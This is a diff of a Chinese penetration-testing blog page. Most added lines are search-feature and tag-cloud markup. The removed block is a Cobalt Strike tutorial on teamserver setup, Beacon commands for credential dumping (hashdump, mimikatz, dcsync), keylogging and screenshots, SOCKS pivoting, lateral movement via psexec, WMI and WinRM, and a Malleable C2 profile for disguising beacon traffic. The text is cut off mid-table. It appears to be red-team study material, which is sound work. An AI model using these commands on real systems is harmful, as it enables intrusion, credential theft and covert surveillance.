@@ -17,7 +17,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
 <meta property="og:type" content="website">
@@ -51,7 +51,9 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
 <script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
 
-  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
 
   <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
   <script src="/js/third-party/tags/mermaid.js" defer></script>
@@ -97,6 +99,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -105,11 +108,37 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
 
 </header>
         
@@ -150,8 +179,9 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
+          <a href="/tags/">
         <span class="site-state-item-count">18</span>
-        <span class="site-state-item-name">标签</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -163,6 +193,37 @@
         <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
+<div class="sidebar-tags">
+  <div class="sidebar-title">标签</div>
+  <div class="tag-cloud">
+    <a href="/tags/Web安全/" style="font-size: 1.4em; color: #e74c3c;">Web安全</a>
+    <a href="/tags/渗透测试/" style="font-size: 1.6em; color: #e74c3c;">渗透测试</a>
+    <a href="/tags/框架安全/" style="font-size: 1.2em;">框架安全</a>
+    <a href="/tags/内网渗透/" style="font-size: 1.1em;">内网渗透</a>
+    <a href="/tags/权限提升/" style="font-size: 1.1em;">权限提升</a>
+    <a href="/tags/云安全/" style="font-size: 1em;">云安全</a>
+    <a href="/tags/工具/" style="font-size: 1em;">工具</a>
+    <a href="/tags/靶场/" style="font-size: 1em;">靶场</a>
+    <a href="/tags/反序列化/" style="font-size: 0.95em;">反序列化</a>
+    <a href="/tags/移动安全/" style="font-size: 0.9em;">移动安全</a>
+    <a href="/tags/代码审计/" style="font-size: 0.9em;">代码审计</a>
+    <a href="/tags/数据库安全/" style="font-size: 0.85em;">数据库安全</a>
+    <a href="/tags/后渗透/" style="font-size: 0.85em;">后渗透</a>
+    <a href="/tags/密码学/" style="font-size: 0.8em;">密码学</a>
+    <a href="/tags/认证安全/" style="font-size: 0.8em;">认证安全</a>
+    <a href="/tags/信息收集/" style="font-size: 0.75em;">信息收集</a>
+    <a href="/tags/方法论/" style="font-size: 0.75em;">方法论</a>
+    <a href="/tags/安全运维/" style="font-size: 0.75em;">安全运维</a>
+  </div>
+</div>
+
+<style>
+.sidebar-tags { margin-top: 20px; padding: 0 15px; }
+.sidebar-tags .sidebar-title { font-size: 1.1em; font-weight: bold; margin-bottom: 10px; color: #555; }
+.sidebar-tags .tag-cloud { line-height: 2; }
+.sidebar-tags .tag-cloud a { display: inline-block; margin: 0 8px 4px 0; padding: 2px 8px; border-radius: 3px; background: #f5f5f5; text-decoration: none; border-bottom: none; }
+.sidebar-tags .tag-cloud a:hover { background: #e74c3c; color: #fff !important; }
+</style>
 
         </div>
       </div>
@@ -220,7 +281,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -312,7 +373,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -404,7 +465,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:14" itemprop="dateModified" datetime="2026-06-05T13:34:14+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -496,7 +557,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -518,334 +579,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Cobalt Strike（简称CS）是由Raphael Mudge开发的商业化渗透测试框架，将后渗透代理（Beacon）、横向移动、隐蔽隧道和报告生成整合在一起，是红队行动中最常用的C2平台之一。本文梳理CS的核心组件与基础使用方法。</p>
-<h2 id="一、Teamserver-部署"><a href="#一、Teamserver-部署" class="headerlink" title="一、Teamserver 部署"></a>一、Teamserver 部署</h2><p>Teamserver是Cobalt Strike的服务端核心，所有Beacon回连到它。基本启动命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法: ./teamserver &lt;IP&gt; &lt;password&gt; [/path/to/profile] [killdate]</span></span><br><span class="line"><span class="built_in">sudo</span> ./teamserver 192.168.1.100 mypassword myprofile.profile</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><strong>IP</strong>：公网或内网可达的服务端IP。</li>
-<li><strong>password</strong>：客户端连接认证密码。</li>
-<li><strong>profile</strong>：可选C2配置文件，用于伪装流量特征。</li>
-<li><strong>killdate</strong>：可选有效期，格式YYYY-MM-DD。</li>
-</ul>
-<p>description: Cobalt Strike 基础使用——TeamServer 搭建、Beacon 命令与 Socks 代理。<br>生产环境建议：使用强密码；定制Malleable C2 Profile；搭配CDN或域前置隐藏真实IP；用systemd或screen保持后台运行；合理设置killdate防止Beacon长期失控。客户端连接时填写host、port（默认50050）、password和用户名。</p>
-<h2 id="二、Listener-监听器类型"><a href="#二、Listener-监听器类型" class="headerlink" title="二、Listener 监听器类型"></a>二、Listener 监听器类型</h2><h3 id="2-1-HTTP-HTTPS-Listener"><a href="#2-1-HTTP-HTTPS-Listener" class="headerlink" title="2.1 HTTP &#x2F; HTTPS Listener"></a>2.1 HTTP &#x2F; HTTPS Listener</h3><p>最常用的类型，Beacon通过HTTP&#x2F;HTTPS请求回连C2。穿透性强，可配合域前置（Domain Fronting）。HTTPS提供传输加密，HTTP便于隐蔽在大量Web流量中。</p>
-<h3 id="2-2-DNS-Listener"><a href="#2-2-DNS-Listener" class="headerlink" title="2.2 DNS Listener"></a>2.2 DNS Listener</h3><p>通过DNS隧道通信，适用于HTTP&#x2F;HTTPS被严格封锁的环境。Beacon发送TXT&#x2F;MX&#x2F;A记录查询，请求携带加密任务数据，Teamserver通过DNS响应下发指令。速度较慢但隐蔽性极高，需提前配置NS记录指向Teamserver。</p>
-<h3 id="2-3-SMB-Listener"><a href="#2-3-SMB-Listener" class="headerlink" title="2.3 SMB Listener"></a>2.3 SMB Listener</h3><p>使用命名管道在同一网段内点对点通信。不产生网络流量，需要已有上线主机作中转（Link Listener）。多个SMB Beacon可串联形成链式连接，适合无法直接出网的内网主机。</p>
-<h3 id="2-4-TCP-Listener-与-External-Listener"><a href="#2-4-TCP-Listener-与-External-Listener" class="headerlink" title="2.4 TCP Listener 与 External Listener"></a>2.4 TCP Listener 与 External Listener</h3><p>TCP Beacon通过原始TCP Socket通信作备用。External Listener用于将MSF等C2框架的session接入CS进行管理。</p>
-<h2 id="三、Beacon-常用命令"><a href="#三、Beacon-常用命令" class="headerlink" title="三、Beacon 常用命令"></a>三、Beacon 常用命令</h2><h3 id="3-1-基础操作"><a href="#3-1-基础操作" class="headerlink" title="3.1 基础操作"></a>3.1 基础操作</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>sleep 5 0</code></td>
-<td>设置休眠间隔（秒）和抖动率</td>
-</tr>
-<tr>
-<td><code>jobs</code> &#x2F; <code>jobkill &lt;id&gt;</code></td>
-<td>查看&#x2F;终止后台任务</td>
-</tr>
-<tr>
-<td><code>exit</code></td>
-<td>终止Beacon进程</td>
-</tr>
-<tr>
-<td><code>note</code></td>
-<td>为当前Beacon添加备注</td>
-</tr>
-</tbody></table>
-<h3 id="3-2-信息收集与文件操作"><a href="#3-2-信息收集与文件操作" class="headerlink" title="3.2 信息收集与文件操作"></a>3.2 信息收集与文件操作</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>shell &lt;cmd&gt;</code></td>
-<td>执行CMD命令</td>
-</tr>
-<tr>
-<td><code>powershell &lt;cmd&gt;</code></td>
-<td>执行PowerShell命令</td>
-</tr>
-<tr>
-<td><code>execute &lt;program&gt;</code></td>
-<td>执行指定程序</td>
-</tr>
-<tr>
-<td><code>pwd</code> &#x2F; <code>cd</code> &#x2F; <code>ls</code></td>
-<td>基本目录操作</td>
-</tr>
-<tr>
-<td><code>download &lt;file&gt;</code> &#x2F; <code>upload &lt;local&gt; &lt;remote&gt;</code></td>
-<td>文件下载&#x2F;上传</td>
-</tr>
-<tr>
-<td><code>ps</code> &#x2F; <code>kill &lt;pid&gt;</code></td>
-<td>进程列表&#x2F;结束进程</td>
-</tr>
-<tr>
-<td><code>getuid</code></td>
-<td>获取当前用户身份</td>
-</tr>
-</tbody></table>
-<h3 id="3-3-网络与域信息"><a href="#3-3-网络与域信息" class="headerlink" title="3.3 网络与域信息"></a>3.3 网络与域信息</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>net view</code> &#x2F; <code>net computers</code></td>
-<td>列出域内计算机</td>
-</tr>
-<tr>
-<td><code>net dclist</code></td>
-<td>列出域控制器</td>
-</tr>
-<tr>
-<td><code>net user</code> &#x2F; <code>net group</code></td>
-<td>列出域用户&#x2F;组</td>
-</tr>
-</tbody></table>
-<h3 id="3-4-凭据操作"><a href="#3-4-凭据操作" class="headerlink" title="3.4 凭据操作"></a>3.4 凭据操作</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>hashdump</code></td>
-<td>导出本地SAM哈希</td>
-</tr>
-<tr>
-<td><code>mimikatz &lt;cmd&gt;</code></td>
-<td>执行Mimikatz命令</td>
-</tr>
-<tr>
-<td><code>logonpasswords</code></td>
-<td>用Mimikatz导出明文凭据</td>
-</tr>
-<tr>
-<td><code>dcsync &lt;domain&gt;</code></td>
-<td>DCSync攻击导出域控哈希</td>
-</tr>
-<tr>
-<td><code>steal_token &lt;pid&gt;</code> &#x2F; <code>rev2self</code></td>
-<td>窃取&#x2F;恢复进程令牌</td>
-</tr>
-<tr>
-<td><code>make_token &lt;user&gt; &lt;domain&gt; &lt;pass&gt;</code></td>
-<td>创建模拟令牌</td>
-</tr>
-</tbody></table>
-<h3 id="3-5-权限提升"><a href="#3-5-权限提升" class="headerlink" title="3.5 权限提升"></a>3.5 权限提升</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>elevate &lt;exploit&gt; &lt;listener&gt;</code></td>
-<td>使用内置提权Exploit</td>
-</tr>
-<tr>
-<td><code>getsystem</code></td>
-<td>尝试获取SYSTEM权限</td>
-</tr>
-<tr>
-<td><code>runasadmin &lt;exploit&gt; &lt;cmd&gt;</code></td>
-<td>以管理员权限执行命令</td>
-</tr>
-</tbody></table>
-<p><code>elevate</code>支持uac-token-duplication、uac-eventvwr、svc-exe等内置技术。</p>
-<h2 id="四、Keystroke、Screenshot-与-Hashdump"><a href="#四、Keystroke、Screenshot-与-Hashdump" class="headerlink" title="四、Keystroke、Screenshot 与 Hashdump"></a>四、Keystroke、Screenshot 与 Hashdump</h2><h3 id="4-1-键盘记录-keylogger"><a href="#4-1-键盘记录-keylogger" class="headerlink" title="4.1 键盘记录 (keylogger)"></a>4.1 键盘记录 (keylogger)</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; keylogger &lt;pid&gt;    # 对指定进程注入键盘记录器</span><br><span class="line">beacon&gt; jobs               # 查看后台键盘记录任务状态</span><br></pre></td></tr></table></figure>
-
-<p>通过SetWindowsHookEx注入目标进程记录键盘输入，适用于捕获凭据和敏感信息。需注意x86&#x2F;x64位匹配。</p>
-<h3 id="4-2-屏幕截图-screenshot"><a href="#4-2-屏幕截图-screenshot" class="headerlink" title="4.2 屏幕截图 (screenshot)"></a>4.2 屏幕截图 (screenshot)</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; screenshot &lt;pid&gt;   # 对指定进程注入截图模块</span><br><span class="line">beacon&gt; screenwatch        # 定时截图并回传</span><br></pre></td></tr></table></figure>
-
-<p>通过PrintWindow API实现，单次截图为JPEG格式回传。screenwatch以固定间隔截图方便监控用户桌面。</p>
-<h3 id="4-3-哈希导出-hashdump"><a href="#4-3-哈希导出-hashdump" class="headerlink" title="4.3 哈希导出 (hashdump)"></a>4.3 哈希导出 (hashdump)</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump           # 导出本地SAM的NTLM哈希</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords  # 从内存导出凭据</span><br></pre></td></tr></table></figure>
-
-<p>hashdump通过注入lsass.exe读取注册表SAM键值和SECURITY\Policy\Secrets提取NTLM哈希，需SYSTEM权限。配合Mimikatz可同时获取明文密码和Kerberos票据。</p>
-<h2 id="五、SOCKS-代理与-Pivoting"><a href="#五、SOCKS-代理与-Pivoting" class="headerlink" title="五、SOCKS 代理与 Pivoting"></a>五、SOCKS 代理与 Pivoting</h2><h3 id="5-1-SOCKS代理"><a href="#5-1-SOCKS代理" class="headerlink" title="5.1 SOCKS代理"></a>5.1 SOCKS代理</h3><p>通过已上线Beacon进入目标内网，右键Beacon -&gt; Pivoting -&gt; SOCKS Server，设置代理端口（如1080）。配合Proxychains：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/proxychains.conf 添加</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br><span class="line"></span><br><span class="line">proxychains nmap -sT -Pn 10.10.10.0/24</span><br><span class="line">proxychains crackmapexec smb 10.10.10.0/24</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-2-其他Pivoting方式"><a href="#5-2-其他Pivoting方式" class="headerlink" title="5.2 其他Pivoting方式"></a>5.2 其他Pivoting方式</h3><table>
-<thead>
-<tr>
-<th>方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Reverse Port Forward</strong></td>
-<td><code>rportfwd 3389 10.10.10.5 3389</code> 将内网端口映射到本地</td>
-</tr>
-<tr>
-<td><strong>Covert VPN</strong></td>
-<td>建立隐蔽VPN隧道接入内网</td>
-</tr>
-<tr>
-<td><strong>SMB&#x2F;TCP Beacon链</strong></td>
-<td>使用SMB或TCP Beacon串联内网主机</td>
-</tr>
-<tr>
-<td><strong>SSH Session</strong></td>
-<td><code>ssh 10.10.10.5:22 user pass</code> 通过Beacon建立SSH连接</td>
-</tr>
-</tbody></table>
-<p>SOCKS代理最灵活，但速度受Beacon sleep时间影响较大，调整sleep可改善体验。</p>
-<h2 id="六、横向移动"><a href="#六、横向移动" class="headerlink" title="六、横向移动"></a>六、横向移动</h2><p>Cobalt Strike提供丰富的横向移动命令。</p>
-<h3 id="6-1-jump-命令"><a href="#6-1-jump-命令" class="headerlink" title="6.1 jump 命令"></a>6.1 jump 命令</h3><p>高级横向移动命令，自动选择合适技术：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; jump &lt;method&gt; &lt;target&gt; &lt;listener&gt;</span><br></pre></td></tr></table></figure>
-
-<p>支持的method：<code>psexec</code>、<code>psexec64</code>、<code>psexec_psh</code>、<code>winrm</code>、<code>winrm64</code>、<code>wmi</code>、<code>wmi64</code>。</p>
-<h3 id="6-2-PsExec"><a href="#6-2-PsExec" class="headerlink" title="6.2 PsExec"></a>6.2 PsExec</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; psexec &lt;target&gt; &lt;listener&gt;</span><br><span class="line">beacon&gt; psexec_psh &lt;target&gt; &lt;listener&gt;  # PowerShell免文件版</span><br></pre></td></tr></table></figure>
-
-<p>原理：通过SMB（445端口）连接ADMIN$共享，上传服务可执行文件，创建并启动服务运行Payload后清理。需要目标管理员凭据。</p>
-<h3 id="6-3-WMI"><a href="#6-3-WMI" class="headerlink" title="6.3 WMI"></a>6.3 WMI</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wmi &lt;target&gt; &lt;listener&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过DCOM&#x2F;WMI接口远程执行命令（端口135及动态高端口）。优势：不落盘（Fileless）直接内存执行；不创建服务减少日志痕迹；通过wmiprvse.exe子进程执行，进程链自然。</p>
-<h3 id="6-4-WinRM"><a href="#6-4-WinRM" class="headerlink" title="6.4 WinRM"></a>6.4 WinRM</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; winrm &lt;target&gt; &lt;listener&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过WinRM服务（5985 HTTP &#x2F; 5986 HTTPS）远程执行命令。要求目标启用WinRM。使用WS-Management协议，相比PsExec更稳定且不易被杀软阻断。</p>
-<p>另可通过 <code>remote-exec wmi/psexec/winrm &lt;target&gt; &lt;cmd&gt;</code> 直接执行任意系统命令。</p>
-<h2 id="七、C2-Profile（Malleable-C2）"><a href="#七、C2-Profile（Malleable-C2）" class="headerlink" title="七、C2 Profile（Malleable C2）"></a>七、C2 Profile（Malleable C2）</h2><p>Malleable C2 Profile是CS最具特色的功能，允许自定义Beacon网络通信特征。核心配置示例：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter &quot;20&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;;</span><br><span class="line">set pipename &quot;msagent_##&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/api/v1/status&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,*/*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;cdn.example.com&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/html&quot;;</span><br><span class="line">        output &#123; base64; print; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/api/v1/upload&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">        id &#123; parameter &quot;id&quot;; &#125;</span><br><span class="line">        output &#123; base64; print; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123; output &#123; print; &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">post-ex &#123;</span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\rundll32.exe&quot;;</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\rundll32.exe&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">    set userwx &quot;false&quot;;</span><br><span class="line">    set obfuscate &quot;true&quot;;</span><br><span class="line">    set smartinject &quot;true&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>主要配置块说明：</p>
-<table>
-<thead>
-<tr>
-<th>配置块</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>http-get</code> &#x2F; <code>http-post</code></td>
-<td>定义HTTP通信请求&#x2F;响应格式</td>
-</tr>
-<tr>
-<td><code>http-stager</code></td>
-<td>Stager下载Payload的HTTP格式</td>
-</tr>
-<tr>
-<td><code>https-certificate</code></td>
-<td>TLS证书配置</td>
-</tr>
-<tr>
-<td><code>dns-beacon</code></td>
-<td>DNS Beacon行为配置</td>
-</tr>
-<tr>
-<td><code>post-ex</code></td>
-<td>后渗透任务（如mimikatz）注入行为</td>
-</tr>
-<tr>
-<td><code>stage</code></td>
-<td>Payload内存加载行为</td>
-</tr>
-<tr>
-<td><code>process-inject</code></td>
-<td>进程注入技术选择</td>
-</tr>
-</tbody></table>
-<p>Profile验证命令：<code>./c2lint example.profile</code>，检查语法正确性和字段合法性。</p>
-<h2 id="八、Cobalt-Strike-vs-Metasploit-对比"><a href="#八、Cobalt-Strike-vs-Metasploit-对比" class="headerlink" title="八、Cobalt Strike vs Metasploit 对比"></a>八、Cobalt Strike vs Metasploit 对比</h2><table>
-<thead>
-<tr>
-<th>对比维度</th>
-<th>Cobalt Strike</th>
-<th>Metasploit Framework</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>定位</strong></td>
-<td>红队&#x2F;C2平台</td>
-<td>通用渗透测试框架</td>
-</tr>
-<tr>
-<td><strong>许可证</strong></td>
-<td>商业授权（付费）</td>
-<td>BSD开源许可</td>
-</tr>
-<tr>
-<td><strong>C2架构</strong></td>
-<td>成熟多协议C2（HTTP&#x2F;DNS&#x2F;SMB&#x2F;TCP）</td>
-<td>Meterpreter为主</td>
-</tr>
-<tr>
-<td><strong>隐蔽性</strong></td>
-<td>高度可定制（Malleable C2）</td>
-<td>基础流量特征易识别</td>
-</tr>
-<tr>
-<td><strong>横向移动</strong></td>
-<td>内置丰富命令，自动化程度高</td>
-<td>需手动组合模块</td>
-</tr>
-<tr>
-<td><strong>协作能力</strong></td>
-<td>多用户协作、共享session</td>
-<td>单用户为主</td>
-</tr>
-<tr>
-<td><strong>Malleable C2</strong></td>
-<td>支持，核心特色</td>
-<td>不支持</td>
-</tr>
-<tr>
-<td><strong>SOCKS代理</strong></td>
-<td>一键开启，稳定可靠</td>
-<td>通过auxiliary模块</td>
-</tr>
-<tr>
-<td><strong>免杀能力</strong></td>
-<td>需搭配Artifact Kit自定义</td>
-<td>模板固定，易被查杀</td>
-</tr>
-<tr>
-<td><strong>报告功能</strong></td>
-<td>内置报告生成</td>
